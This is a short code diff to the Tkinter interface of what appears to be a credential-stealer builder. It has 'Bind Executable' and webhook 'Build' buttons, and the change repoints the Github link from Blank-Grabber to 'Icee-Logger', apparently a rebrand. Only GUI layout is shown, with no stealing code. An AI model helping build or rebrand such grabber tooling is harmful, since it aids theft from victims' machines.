@@ -70,7 +70,7 @@ class Builder:
 		BindButton = tk.Button(text= "Bind Executable", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: self.BindFileSelect(BoundFileNameLabel))
 		BindButton.place(x= 560, y= 180, anchor= "e")
 
-		GithubButton = tk.Button(text= "Github", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: webbrowser.open("https://github.com/Blank-c/Blank-Grabber", new= 2))
+		GithubButton = tk.Button(text= "Github", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: webbrowser.open("https://github.com/iceeburr/Icee-Logger", new= 2))
 		GithubButton.place(x= 770, y= 180, anchor= "e")
 
 		BuildButton = tk.Button(text= "Build", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font = ("Franklin Gothic", 10, "bold"), command= lambda: self.Build(webhookEntry.get()))
